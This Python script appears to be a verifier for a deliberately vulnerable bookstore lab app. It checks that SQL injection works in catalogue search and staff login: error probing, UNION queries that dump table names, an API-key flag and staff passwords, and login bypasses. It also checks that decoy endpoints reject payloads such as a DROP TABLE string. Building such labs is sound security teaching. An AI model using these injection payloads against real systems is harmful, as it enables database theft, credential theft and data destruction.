import re
import sys

import requests

BASE = sys.argv[1].rstrip("/")
P = BASE + "/books"
FLAG = re.compile(r"FLAG\{booknook_[a-z_]+\}")
VER = re.compile(r"\b3\.\d+\.\d+\b")


def step(name, ok):
    print(f"{name}: {'PASS' if ok else 'FAIL'}")


def cells(html):
    return re.findall(r"<td>(?:<a [^>]*>)?([^<]*)", html)


def search(q):
    return requests.get(P + "/catalogue", params={"q": q}, timeout=15).text


def login(u, p="x"):
    s = requests.Session()
    s.post(P + "/staff/login", data={"username": u, "password": p}, allow_redirects=False, timeout=15)
    r = s.get(P + "/staff/", timeout=15)
    return r.text


def signed_in_text(html):
    m = re.search(r"Signed in as (.*?) \(", html, re.S)
    return m.group(1) if m else ""


def main():
    # --- catalogue search: error + UNION
    t = search("a'")
    step("search-error-visible", "Search failed" in t and "syntax error" in t)
    t = search("zzzz' UNION SELECT 1,sqlite_version(),3,4,5--")
    step("search-union-version", bool(VER.search(" ".join(cells(t)))))
    t = search("zzzz' UNION SELECT 1,group_concat(name),3,4,5 FROM sqlite_master WHERE type='table'--")
    c = " ".join(cells(t))
    step("search-union-tables", "partner_keys" in c and "staff" in c and "books" in c)
    t = search("zzzz' UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info('partner_keys')--")
    c = " ".join(cells(t))
    step("search-union-columns", "api_key" in c and "partner" in c)
    t = search("zzzz' UNION SELECT 1,partner,api_key,4,5 FROM partner_keys--")
    step("search-union-dump-flag", bool(FLAG.search(t)))
    t = search("zzzz' UNION SELECT 1,username,password,4,5 FROM staff--")
    step("search-union-dump-rows", "Bk-Adm1n" in t)

    # --- staff login: auth bypass + UNION through the session banner
    step("login-bypass-comment", "Staff dashboard" in login("admin'--"))
    step("login-bypass-or", "Staff dashboard" in login("x' OR 1=1--"))
    step("login-wrong-creds-rejected", "Staff dashboard" not in login("admin", "wrong"))
    t = login("x' UNION SELECT 1,2,sqlite_version(),4--")
    step("login-union-version", bool(VER.search(signed_in_text(t))))
    t = login("x' UNION SELECT 1,2,(SELECT group_concat(name) FROM sqlite_master WHERE type='table'),4--")
    s = signed_in_text(t)
    step("login-union-tables", "partner_keys" in s and "staff" in s)
    t = login("x' UNION SELECT 1,2,(SELECT group_concat(name) FROM pragma_table_info('partner_keys')),4--")
    step("login-union-columns", "api_key" in signed_in_text(t))
    t = login("x' UNION SELECT 1,2,(SELECT group_concat(api_key) FROM partner_keys),4--")
    step("login-union-dump-flag", bool(FLAG.search(signed_in_text(t))))
    t = login("x' UNION SELECT 1,2,(SELECT group_concat(username||':'||password) FROM staff),4--")
    step("login-union-dump-rows", "admin:" in signed_in_text(t))
    r = requests.post(P + "/staff/login", data={"username": "x'", "password": "y"}, timeout=15)
    step("login-error-visible", "Sign in failed" in r.text)

    # --- decoys must not be injectable
    allb = requests.get(P + "/catalogue", timeout=15).text
    t = requests.get(P + "/book", params={"id": "1 OR 1=1"}, timeout=15).text
    step("decoy-book-id", "could not be found" in t)
    t = requests.get(P + "/book", params={"id": "1'"}, timeout=15).text
    step("decoy-book-id-quote", "could not be found" in t and "syntax" not in t)
    t = requests.get(P + "/catalogue", params={"category": "Fiction' OR '1'='1"}, timeout=15).text
    step("decoy-category", "No titles matched" in t and "syntax" not in t)
    t = requests.get(P + "/catalogue", params={"category": "x' UNION SELECT 1,2,sqlite_version(),4,5--"}, timeout=15).text
    step("decoy-category-union", not VER.search(" ".join(cells(t))))
    t = requests.get(P + "/catalogue", params={"sort": "price; DROP TABLE books"}, timeout=15).text
    step("decoy-sort", "syntax" not in t and "<table>" in t)
    s = requests.Session()
    s.post(P + "/staff/login", data={"username": "admin'--", "password": ""}, timeout=15)
    t = s.get(P + "/staff/orders", params={"status": "x' OR '1'='1"}, timeout=15).text
    step("decoy-staff-orders", "No orders." in t)
    t = s.get(P + "/staff/backup/download", params={"file": "x' OR 1=1--"}, timeout=15)
    step("decoy-backup", t.status_code == 404)
    t = requests.get(P + "/backup", timeout=15)
    step("decoy-public-backup", t.status_code == 403)
    r = requests.post(P + "/newsletter", data={"email": "a'b@example.com"}, allow_redirects=True, timeout=15)
    step("decoy-newsletter", r.status_code == 200 and "syntax" not in r.text)
    step("catalogue-baseline", allb.count("<tr>") > 5)


main()
